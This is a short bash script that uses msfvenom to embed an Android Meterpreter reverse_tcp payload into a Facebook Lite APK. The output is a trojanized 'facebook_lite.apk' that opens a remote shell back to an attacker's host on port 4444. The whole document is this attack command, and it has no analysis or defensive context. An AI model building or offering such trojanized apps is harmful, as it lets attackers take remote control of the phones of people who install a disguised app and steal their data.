#!/bin/bash
msfvenom -x facebook_lite_v363.0.0.6.63.apk -p android/meterpreter/reverse_tcp LHOST="ip address" LPORT=4444 -o facebook_lite.apk
